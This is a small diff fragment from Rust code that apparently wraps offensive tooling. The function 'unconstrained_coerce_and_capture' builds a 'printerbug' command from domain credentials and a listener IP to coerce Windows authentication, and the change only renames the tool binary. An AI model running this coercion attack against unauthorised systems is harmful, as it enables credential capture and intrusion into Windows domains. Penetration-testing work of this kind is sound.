@@ -61,7 +61,7 @@ pub async fn unconstrained_coerce_and_capture(args: &Value) -> Result<ToolOutput
 
     let creds = format!("{domain}/{username}:{password}@{coerce_from}");
 
-    CommandBuilder::new("printerbug.py")
+    CommandBuilder::new("printerbug")
         .arg(creds)
         .arg(listener_ip)
         .timeout_secs(60)
